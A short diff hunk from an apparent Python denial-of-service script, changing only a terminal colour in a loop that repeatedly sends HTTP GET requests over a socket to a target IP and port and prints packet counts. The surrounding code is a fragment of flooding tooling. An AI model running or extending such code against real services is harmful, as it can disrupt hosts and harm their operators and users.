@@ -60,7 +60,7 @@ def goForDosThatThing():
                         time.sleep(1) 
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(Colors.BOLD + Colors.OKBLUE + "Sent packet . . . ." + Colors.FAIL + str(Count.packetCounter))
+                        print(Colors.BOLD + Colors.OKBLUE + "Sent packet . . . ." + Colors.OKCYAN + str(Count.packetCounter))
                         Count.packetCounter = Count.packetCounter + 1
                         print(Colors.BOLD + Colors.BOLD + "successful:> " + Colors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
                     except socket.error:
